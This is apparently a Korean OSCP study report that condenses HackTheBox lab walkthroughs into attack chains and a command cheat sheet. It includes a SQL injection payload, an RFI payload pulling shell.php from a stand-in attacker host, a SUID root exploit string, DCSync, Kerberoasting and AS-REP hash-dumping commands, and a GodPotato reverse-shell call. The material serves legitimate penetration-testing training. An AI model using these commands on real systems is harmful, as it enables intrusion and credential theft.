# HTB 침투 시나리오 정밀 분석 및 OSCP 실전 전술 보고서

본 보고서는 오펜시브 시큐리티 인증 전문가(OSCP) 자격시험을 준비하는 보안 전문가를 위한 종합 기술 분석서이다. HackTheBox(HTB) 플랫폼에서 제공되는 46개의 고난도 머신을 대상으로, 보안 연구가 0xdf의 분석 방법론을 심층 검토하여 각 타겟별 핵심 공격 벡터, 도구 활용법 및 실제 명령어 체계를 상세히 정리하였다. 본 보고서의 목적은 단순한 해법 나열이 아니라, 각 취약점의 근본 원인과 침투 테스터가 마주하게 될 다양한 시나리오에 대한 전략적 이해를 제공하는 데 있다.

## 1. 최신 보안 트렌드와 OSCP 준비 전략

현대적인 침투 테스트 환경은 단순한 단일 취약점 공격에서 벗어나 Active Directory(AD) 인프라에 대한 깊이 있는 이해와 웹 애플리케이션의 복합적인 결함을 이용한 공격 체인(Attack Chain) 구축 능력을 요구한다. 특히 OSCPv3로의 전환 이후 AD CS(Active Directory Certificate Services)와 다양한 웹 프레임워크의 취약점이 핵심 평가 요소로 자리 잡았다. 본 보고서에서 분석하는 46개의 머신은 이러한 실전적 요구사항을 완벽하게 반영하고 있으며, 각각의 사례는 침투 테스터가 현장에서 직면할 수 있는 실제적인 위협 모델을 제시한다.

## 2. 윈도우 인프라 및 Active Directory 머신 정밀 분석

윈도우 기반 머신들은 주로 사용자 자격 증명 탈취, 권한 전이(Lateral Movement), 그리고 도메인 컨트롤러(DC) 장악을 목표로 한다. AD CS와 같은 최신 공격 벡터는 도메인 관리자 권한을 획득하는 데 결정적인 역할을 한다.

### 2.1 TombWatcher: AD CS ESC15와 데이터 복구 기반 권한 상승

TombWatcher는 일반적인 기업 환경의 펜테스트 상황을 가정하여 초기 자격 증명이 부여된 'Assume Breach' 시나리오로 시작한다. 공격자는 BloodHound를 활용하여 도메인 내의 관계를 시각화하고, Targeted Kerberoasting 및 그림자 자격 증명(Shadow Credentials) 공격을 통해 상위 계정으로 이동한다.

|**공격 단계**|**주요 도구**|**목적 및 컨텍스트**|
|---|---|---|
|초기 정찰|BloodHound|도메인 내 계정 관계 및 공격 경로 식별|
|권한 전이|NetExec|SMB 및 LDAP 기반 자격 증명 유효성 검증|
|최종 장악|AD CS Exploit|ESC15 취약점을 이용한 관리자 권한 획득|

이 머신에서 가장 중요한 통찰은 AD 복구 센터(AD Recycle Bin)의 활용이다. 테스터는 삭제된 객체 내에 남아있는 과거의 관리자 계정 정보를 복구함으로써 보안 체인의 약점을 파고든다. 이는 데이터 보존 정책이 보안에 미치는 영향력을 시사한다.

### 2.2 Fluffy: Library-ms 조작 및 AD CS ESC16 공격

Fluffy 머신은 윈도우 라이브러리 파일(`library-ms`)의 처리 결함(CVE-2025-24071)을 이용해 공격자 서버로 인증 요청을 유도하는 기법을 보여준다. 이 과정에서 획득한 NetNTLMv2 해시를 크래킹하여 초기 거점을 확보한다.

|**주요 도구**|**실행 명령어**|**활용 상황 및 이유**|
|---|---|---|
|NetExec|`netexec smb dc01.fluffy.htb -u [user] -p [pass]`|획득한 자격 증명의 유효성 및 권한 확인|
|BloodHound|`bloodhound-python -c ALL -u [user] -p [pass] -d fluffy.htb`|AD 인프라 데이터 수집 및 권한 맵핑|
|Certipy|`certipy find -u [user] -p [pass] -dc-ip [IP] -vulnerable`|AD CS 취약 템플릿 탐색 (ESC16 타겟)|

테스터는 특정 계정에 대한 `GenericWrite` 권한을 남용하여 WinRM 접근권을 얻은 후, AD CS ESC16 취약점을 공격하여 도메인 관리자 권한을 획득한다. 이는 최신 윈도우 보안 패치 상황에서도 구성 오류가 얼마나 치명적인지를 잘 보여주는 사례이다.

### 2.3 Administrator: 순수 AD 환경의 권한 연쇄

Administrator 머신은 웹 서버 없이 오직 AD 서비스들(LDAP, SMB, Kerberos)만으로 구성된 환경을 제공한다. 초기 자격 증명인 `Olivia` 계정을 통해 BloodHound 데이터를 수집하고, 계정 간의 비밀번호 변경 권한을 연쇄적으로 활용한다.

|**분석 대상**|**핵심 취약점 및 행위**|**활용 도구**|
|---|---|---|
|FTP 공유|Password Safe 파일 노출 및 크래킹|john / hashcat|
|Kerberos|Targeted Kerberoasting 공격|GetUserSPNs.py|
|Domain Controller|DCSync 공격을 통한 모든 해시 덤프|secretsdump.py|

이 시나리오에서는 파일 공유 서버(FTP)에 방치된 비밀번호 관리 파일이 전체 도메인의 붕괴로 이어지는 과정을 기술적으로 증명한다.

### 2.4 Certified: AD CS ESC9 및 UPN 수정 공격

Certified 머신은 AD CS 공격 벡터 중 ESC9을 집중적으로 다룬다. 공격자는 특정 사용자의 UPN(User Principal Name)을 수정할 수 있는 권한을 획득하고, 이를 관리자의 이름으로 변경한 뒤 인증서를 발급받는다.

주요 절차는 다음과 같다:

1. BloodHound를 이용해 `WriteOwner` 권한이 있는 그룹 식별.
    
2. 해당 그룹에 사용자를 추가하여 권한 상승 거점 확보.
    
3. `msPKI-Enrollment-Flag`와 UPN 조작을 통한 ESC9 공격 수행.
    
4. 발급된 인증서로 도메인 관리자 세션 확보.
    

### 2.5 Cicada: 정보 노출과 SeBackupPrivilege 권한 남용

Cicada는 SMB 익명 접근을 통해 확보한 문서 파일에서 초기 비밀번호를 발견하며 시작한다. 이후 `netexec`의 RID 사이클링 기능을 사용하여 도메인 사용자 목록을 생성하고 패스워드 스프레이(Password Spray)를 수행한다.

Bash

```
# RID 사이클링을 통한 사용자 수집
netexec smb CICADA-DC -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users
```

최종적으로 `SeBackupPrivilege` 권한을 가진 사용자를 확보하고, 이를 통해 `ntds.dit`와 SYSTEM 레지스트리 하이브를 복사하여 도메인 전체 해시를 추출한다.

### 2.6 Mailing: Outlook Moniker Link(CVE-2024-21413)

Mailing 머신은 이메일 클라이언트를 통한 사회 공학적 공격과 기술적 취약점의 결합을 보여준다. Outlook의 Moniker Link 취약점을 악용하여 피해자가 메일의 링크를 클릭할 때 NetNTLMv2 해시를 가로채도록 유도한다.

이후 `GodPotato`와 같은 권한 상승 도구를 사용하여 `SeImpersonatePrivilege`를 시스템 권한으로 격상시킨다. 이는 서비스 계정의 특권 남용이 윈도우 보안에서 차지하는 비중을 잘 설명한다.

### 2.7 Manager: MSSQL 정찰 및 AD CS ESC7

Manager 머신은 초기 정찰 단계에서 비밀번호 스프레이를 통해 유효한 계정을 확보하며 시작한다. MSSQL 서비스의 `xp_dirtree` 기능을 사용하여 파일 시스템을 탐색하고, 웹 서버의 백업 파일에서 자격 증명을 탈취한다. 권한 상승은 AD CS의 인증서 관리 권한을 오용하는 ESC7 공격을 통해 이루어진다.

### 2.8 Escape & EscapeTwo: MSSQL과 AD CS의 복합 공격

Escape 머신은 MSSQL 서버를 통한 정보 유출에 집중한다. `xp_dirtree`를 활용해 NetNTLMv2 해시를 가로채고, 이를 크래킹하여 `sql_svc` 권한을 얻는다. AD CS 공격 도구인 `Certify`와 `Certipy`를 활용하여 취약한 템플릿을 식별하고 관리자 권한으로 상승한다. EscapeTwo 역시 MSSQL의 `sa` 권한 획득과 AD CS ESC4 공격을 결합한 고난도 시나리오를 제공한다.

### 2.9 Flight: RFI를 통한 NetNTLMv2 탈취 및 DCSync

Flight 머신은 서브도메인 정찰과 파일 읽기 취약점을 결합한다. 원격 파일 포함(RFI) 테스트를 통해 윈도우 서버가 공격자의 SMB 공유에 접근하게 함으로써 서비스 계정 해시를 획득한다. 최종적으로 특정 그룹의 권한을 확보하여 DCSync 공격으로 도메인을 장악한다.

### 2.10 StreamIO: MSSQL 스택 쿼리 주입과 LAPS 비밀번호 탈취

StreamIO는 윈도우 기반 PHP 환경에서 MSSQL 데이터베이스를 사용하는 독특한 구성을 가지고 있다. `login.php`에서의 시간 기반 블라인드 SQL 인젝션(Stacked Queries)이 핵심 공격 벡터이다.

|**공격 유형**|**주요 페이로드**|**목적**|
|---|---|---|
|SQLi (Time-based)|`username=admin';WAITFOR DELAY '0:0:5'--`|데이터베이스 구조 및 사용자 해시 추출|
|RFI|`?debug=master.php` (POST `include=http://attacker/shell.php`)|원격 코드 실행 및 초기 쉘 획득|
|LAPS|`Get-LAPSADPassword -Identity DC01`|로컬 관리자 비밀번호 획득을 통한 권한 상승|

### 2.11 Intelligence: PDF 메타데이터 정찰과 GMSA 비밀번호 덤프

Intelligence 머신은 웹 서버에 게시된 수백 개의 PDF 파일을 다운로드하고 스크립트로 메타데이터를 분석하여 사용자 목록을 생성하는 능력을 테스트한다. 이후 DNS 레코드를 조작하여 특정 계정의 인증 시도를 가로채고, 최종적으로 GMSA(Group Managed Service Account)의 관리 권한을 악용하여 DC의 해시를 덤프한다.

### 2.12 Blackfield: AS-REP 로스팅과 RPC 기반 패스워드 초기화

Blackfield는 사전 정보가 없는 상태에서 사용자 목록을 수집하고, `UF_DONT_REQUIRE_PREAUTH` 속성이 활성화된 사용자를 대상으로 AS-REP 로스팅을 수행한다. BloodHound를 통해 `audit2020` 사용자가 다른 계정의 비밀번호를 초기화할 수 있는 권한을 가졌음을 확인하고, RPC를 통해 이를 실행한다.

### 2.13 Sauna & Cascade: AD 열람과 로그 분석을 통한 권한 상승

Sauna는 웹 사이트의 직원 정보를 기반으로 사용자 목록을 추측하고 AS-REP 로스팅을 시도한다. 레지스트리의 `AutoLogon` 키에서 자격 증명을 발견하는 고전적이지만 실전적인 기법을 포함한다. Cascade는 LDAP 익명 접근을 통해 확보한 '사용자 설명' 필드에서 단서를 찾고, TightVNC의 암호화된 비밀번호를 복구하는 기술적 분석을 요구한다.

### 2.14 Forest & Monteverde: 고전적 AD 공격과 Azure AD Connect

Forest 머신은 RPC를 통한 사용자 수집, Kerberos 공격, WinRM 권한 상승으로 이어지는 AD 공격의 표준 가이드를 제시한다. Monteverde는 Azure AD Connect 환경에서 데이터베이스 내에 저장된 관리자 비밀번호를 복구하는 특화된 시나리오를 제공한다.

### 2.15 Heist & Access: 메모리 덤프 및 파일 분석 기술

Heist 머신은 Cisco 설정 파일의 Type 7 해시를 복구하고, 실행 중인 Firefox 프로세스의 메모리를 덤프하여 저장된 비밀번호를 추출하는 포렌식적 접근을 요구한다. Access는 FTP 익명 접근으로 얻은 MS Access 데이터베이스(`.mdb`) 파일을 분석하여 압축 파일의 비밀번호와 계정 정보를 확보하는 과정을 담고 있다.

## 3. 리눅스 기반 웹 애플리케이션 및 서비스 침투 정밀 분석

리눅스 머신들은 주로 최신 CVE 취약점, CMS의 구성 오류, 그리고 시스템 서비스의 권한 설정을 공격 타겟으로 한다.

### 3.1 Editor: XWiki 및 솔라 검색 기반 RCE와 PATH 인젝션

Editor 머신은 XWiki 인스턴스와 Solr 검색 엔진의 상호작용을 타겟으로 한다. 테스터는 인증되지 않은 상태에서 Solr 검색 필터에 Groovy 스크립트를 주입하여 원격 코드 실행을 달성한다.

|**단계**|**도구**|**명령어 및 컨텍스트**|
|---|---|---|
|초기 정찰|nmap|`nmap -p 80,8080 -sCV wiki.editor.htb`|
|초기 침투|Groovy Script|XWiki API 엔드포인트를 통한 악성 스크립트 실행|
|권한 상승|PATH Hijack|`ndsudo` 바이너리 실행 시 PATH 변수 조작|

루트 권한 상승은 `ndsudo`라는 SetUID 바이너리가 시스템 명령을 호출할 때 절대 경로를 사용하지 않는다는 점을 악용한다. 이는 공유 라이브러리 로딩이나 환경 변수 조작에 기반한 고전적인 권한 상승 기법을 학습하기에 최적의 사례이다.

### 3.2 Dog: Backdrop CMS와 Git 노출 취약점 활용

Dog 머신은 웹 루트에 노출된 `.git` 디렉토리를 통해 소스 코드와 설정 파일을 복구하는 능력을 요구한다. 확보된 자격 증명으로 Backdrop CMS 관리 페이지에 접속한 후, 악성 PHP 모듈을 업로드하여 쉘을 획득한다. 루트 상승은 `bee` 툴을 사용하여 임의의 PHP 코드를 루트 권한으로 실행하는 방식으로 진행된다.

### 3.3 Titanic: Gitea 경로 트래버설과 ImageMagick 취약점

Titanic은 Gitea 인스턴스에서 소스 코드를 관리하는 환경을 제공한다. Flask 애플리케이션의 경로 트래버설 취약점을 이용해 Gitea의 내부 데이터베이스를 읽고 해시를 추출한다. 권한 상승 단계에서는 ImageMagick의 공유 객체 로딩 취약점(CVE-2024-41817)을 악용하여 크론탭 작업 수행 시 공격자의 코드가 실행되도록 유도한다.

### 3.4 LinkVortex: Ghost CMS 심볼릭 링크 공격

LinkVortex는 Ghost CMS(버전 5.58)에서 발생하는 CVE-2023-40028 취약점을 다룬다. 공격자는 ZIP 파일 내에 심볼릭 링크를 포함하여 업로드함으로써 서버 내부의 임의 파일을 읽어올 수 있다.

Bash

```
# 심볼릭 링크를 포함한 ZIP 파일 제작 예시
ln -s /etc/passwd link
zip --symlinks payload.zip link
```

이후 `clean_symlink.sh`라는 관리 스크립트의 인자 처리 미숙을 이용하여 루트 권한을 획득한다.

### 3.5 BoardLight: Dolibarr CMS와 Enlightenment SUID 공격

BoardLight는 Dolibarr v17.0.0의 PHP 코드 인젝션 취약점(CVE-2023-30253)을 공격한다. 대소문자를 혼용한 우회 기법으로 필터링을 무력화하고 웹 쉘을 획득한다. 루트 상승은 `enlightenment_sys` 바이너리의 경로 처리 결함(CVE-2022-37706)을 타겟으로 한다.

|**주요 명령어**|**활용 파라미터**|**결과**|
|---|---|---|
|`enlightenment_sys`|`/bin/mount -o..., "/dev/../tmp/;/tmp/pwn"`|루트 쉘 획득|

이 공격은 `system()` 호출 시 입력값 검증이 부재한 경우 얼마나 치명적인 권한 상승 경로가 열리는지를 명확히 보여준다.

### 3.6 Usage: Laravel-Admin 블라인드 SQLi와 7z 와일드카드

Usage 머신은 Laravel 프레임워크 기반의 웹 사이트에서 발생하는 블라인드 SQL 인젝션을 핵심으로 한다. 관리자 해시를 탈취한 후, Laravel-Admin 패널의 이미지 업로드 기능을 우회하여 PHP 실행 권한을 얻는다. 루트 권한 상승은 `7z` 명령어가 와일드카드(`*`)를 사용할 때 발생하는 파일 이름 하이재킹 공격을 활용한다.

### 3.7 Monitored: Nagios XI 관리 도구 침투 체인

Monitored 머신은 모니터링 시스템인 Nagios XI의 다단계 침투 과정을 보여준다. SNMP를 통한 정보 수집, API 토큰 탈취, SQL 인젝션을 통한 관리자 키 확보, 그리고 모니터링 명령 설정 기능을 이용한 RCE로 이어진다. 이는 복잡한 관리 툴의 기능 하나하나가 공격자에게는 강력한 무기가 될 수 있음을 시사한다.

### 3.8 CozyHosting: Spring Boot Actuator와 세션 하이재킹

CozyHosting은 Java 기반 Spring Boot 애플리케이션의 일반적인 설정 오류인 Actuator 노출을 공격한다. `/actuator/sessions` 경로에서 관리자의 JSESSIONID를 획득하여 세션을 탈취한다. 권한 상승은 SSH의 `ProxyCommand` 옵션과 `sudo` 권한을 결합한 독특한 기법을 요구한다.

### 3.9 Sau: SSRF와 Maltrail 커맨드 인젝션

Sau 머신은 `Request Basket` 서비스의 SSRF 취약점을 이용해 내부망에서만 접근 가능한 `Maltrail` 관리 페이지에 침투한다. Maltrail v0.53에서 발생하는 커맨드 인젝션을 통해 초기 접근권을 얻고, 최종적으로 `systemctl`의 페이저인 `less` 명령 내에서 쉘을 실행하여 루트 권한을 얻는다.

### 3.10 Broker: ActiveMQ 역직렬화 및 Nginx 권한 남용

Broker 머신은 Java 기반 메시지 브로커인 ActiveMQ의 RCE 취약점(CVE-2023-46604)을 타겟으로 한다. 이후 `sudo` 권한으로 실행 가능한 `nginx` 설정을 조작하여 `ld.so.preload` 파일을 덮어쓰고, 공유 객체를 로드시켜 루트 권한을 획득하는 고급 기법을 사용한다.

### 3.11 Intentions: 2단계 SQL 인젝션과 ImageMagick

Intentions는 단순한 주입을 넘어, 데이터베이스에 저장된 값이 나중에 사용될 때 발생하는 'Second-order SQL Injection'을 다룬다. 관리자 권한 획득 후에는 ImageMagick의 임의 객체 인스턴스화 기능을 악용하여 서버 측에 악성 파일을 기록하고 실행한다.

### 3.12 Aero: Windows ThemeBleed 및 커널 익스플로잇

Aero 머신은 리눅스 환경은 아니지만, 웹을 통해 윈도우 11의 최신 취약점인 ThemeBleed(CVE-2023-38146)를 실습할 수 있는 환경을 제공한다. 공격자는 악성 테마 파일을 업로드하고, 서버 측의 검증 프로세스를 통해 DLL 하이재킹과 원격 코드 실행을 달성한다. 루트 상승은 노코야와(Nokoyawa) 랜섬웨어 그룹이 사용한 커널 취약점(CVE-2023-28252)을 활용한다.

### 3.13 Busqueda: Python Searchor Eval 공격

Busqueda 머신은 Python 라이브러리인 Searchor의 `eval()` 함수 사용 미숙으로 인해 발생하는 코드 주입 취약점을 타겟으로 한다. 테스터는 명령줄 인터페이스(CLI) 도구의 동작을 분석하고, 쿼리 파라미터 내에 파이썬 페이로드를 삽입하여 RCE를 달성한다. 권한 상승은 `system-checkup.py`라는 파이썬 스크립트의 실행 권한을 남용한다.

### 3.14 Soccer: Websockets 기반 SQL 인젝션

Soccer 머신은 일반적인 HTTP 요청이 아닌 웹소켓(Websockets) 통신을 통해 발생하는 SQL 인젝션을 다룬다. `sqlmap`과 같은 자동화 도구를 웹소켓에 연결하기 위해 중간 프록시 스크립트를 작성하는 능력이 요구된다. 루트 상승은 `dstat` 툴의 사용자 플러그인 기능을 악용한다.

### 3.15 UpDown: PHAR 역직렬화 및 easy_install

UpDown 머신은 Git 저장소 노출을 통해 확인된 소스 코드를 바탕으로 PHP 아카이브(`.phar`)를 활용한 LFI to RCE 공격을 수행한다. 내부에서는 파이썬의 `input()` 함수 취약점을 이용해 사용자를 전환하고, `easy_install` 명령의 `sudo` 권한을 이용해 루트 쉘을 획득한다.

### 3.16 Pandora & Magic: 경로 하이재킹 및 파일 업로드 우회

Pandora는 SNMP 열람과 Pandora FMS 시스템의 다중 취약점(SQLi, RCE)을 결합한다. Magic 머신은 SQL 인젝션 로그인 우회와 이중 확장자(`.php.png`)를 이용한 파일 업로드 필터 무력화를 보여준다. 두 머신 모두 `PATH` 환경 변수 하이재킹을 통한 권한 상승 기법을 포함하고 있다.

### 3.17 Help & Networked: 고전적 취약점과 설정 미비

Help 머신은 GraphQL 엔드포인트 정찰과 HelpDeskZ 소프트웨어의 업로드 파일명 예측 취약점을 타겟으로 하며, 리눅스 커널 취약점(CVE-2017-16995)을 학습하기에 좋다. Networked 머신은 아파치 서버의 설정 오류로 인해 실행 가능해진 이미지 파일을 통한 웹 쉘 획득 사례를 보여준다.

## 4. OSCP 실전 전술 및 명령 체계 요약 (CheatSheet)

분석된 46개 머신에서 반복적으로 사용되는 핵심 명령 체계를 공격 단계별로 요약한다.

### 4.1 정찰 및 정보 수집 (Reconnaissance)

|**대상 서비스**|**도구**|**명령어 및 컨텍스트**|
|---|---|---|
|포트 스캐닝|nmap|`nmap -p- --min-rate 10000 [IP]`|
|웹 디렉토리 퍼징|feroxbuster|`feroxbuster -u http:// -x php,html,txt`|
|서브도메인 탐색|ffuf|`ffuf -u http://[IP] -H "Host: FUZZ.domain.htb" -w [list] -ac`|
|SMB 공유 열람|smbclient|`smbclient -N -L //[IP]` (익명 접근 시도)|

### 4.2 자격 증명 탈취 및 Active Directory 공격

AD 환경에서는 관계 기반의 공격이 주를 이룬다.

- **AS-REP Roasting**: `impacket-GetNPUsers [domain]/ -usersfile [list] -format hashcat -outputfile hashes`
    
- **Kerberoasting**: `impacket-GetUserSPNs [domain]/[user]:[pass] -request`
    
- **DCSync**: `impacket-secretsdump [domain]/[admin]@[IP] -just-dc-user administrator`
    
- **RID Cycling**: `netexec smb [IP] -u guest -p '' --rid-brute`
    
- **AD CS 탐색**: `certipy find -u [user] -p [pass] -dc-ip [IP] -vulnerable`
    

### 4.3 웹 취약점 및 RCE (Initial Foothold)

웹 애플리케이션 침투를 위해 반드시 숙지해야 할 명령 체계이다.

- **LFI/RFI 필터 우회**: `php://filter/convert.base64-encode/resource=[file]`
    
- **SQLmap Websockets**: `sqlmap -u "ws://[IP]:[Port]" --data '{"id":"1"}'`
    
- **Gitea/Git 저장소 복구**: `git-dumper http:///.git/ [output]`
    
- **ZIP 심볼릭 링크**: `zip --symlinks [out].zip [link]`
    

### 4.4 권한 상승 (Privilege Escalation)

|**유형**|**운영체제**|**핵심 행위 및 명령어**|
|---|---|---|
|SUID 탐색|Linux|`find / -perm -4000 2>/dev/null`|
|Sudo 권한 확인|Linux|`sudo -l` (GTFOBins 참조 필수)|
|레지스트리 정찰|Windows|`reg query HKLM /f password /t REG_SZ /s`|
|히스토리 분석|Windows|`cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`|
|특권 남용|Windows|`GodPotato.exe -cmd "reverse_shell.exe"` (SeImpersonatePrivilege)|

## 5. 결론 및 침투 테스터를 위한 제언

본 보고서에서 분석한 46개의 HTB 머신은 단순한 '해킹'이 아닌, 체계적인 '위협 분석'과 '전술적 대응'의 중요성을 강조한다. 테스터는 다음의 세 가지 핵심 통찰을 항상 견지해야 한다.

첫째, **정보의 파편화와 결합 능력**이다. Heist나 Access 머신처럼 별 의미 없어 보이는 설정 파일이나 오래된 데이터베이스 파일 하나가 전체 인프라를 무너뜨리는 '마스터 키'가 될 수 있음을 명심해야 한다.

둘째, **AD CS와 같은 최신 공격 벡터에 대한 기술적 숙련도**이다. 윈도우 보안의 중심이 AD CS로 이동함에 따라 ESC1부터 ESC16까지의 다양한 시나리오를 자유자재로 다룰 수 있는 능력은 현대 침투 테스터의 필수 역량이다.

셋째, **시스템 정상 기능의 악의적 활용**이다. Titanic의 ImageMagick이나 Sau의 `systemctl` 사례처럼, 취약한 코드가 없더라도 시스템의 정상적인 운영 방식(크론탭, 페이저 설정)을 공격의 경로로 전환하는 창의적인 사고가 요구된다.

OSCP 합격과 실무 능력 배양을 위해서는 본 보고서의 시나리오들을 자신의 환경에서 직접 재현해보고, 각 단계에서 왜 해당 도구와 명령어가 사용되었는지 근본적인 원인을 끊임없이 질문해야 한다. 이러한 과정이 반복될 때, 침투 테스터는 어떠한 복잡한 환경에서도 승리할 수 있는 자신만의 기술 체계(CheatSheet)를 완성하게 될 것이다.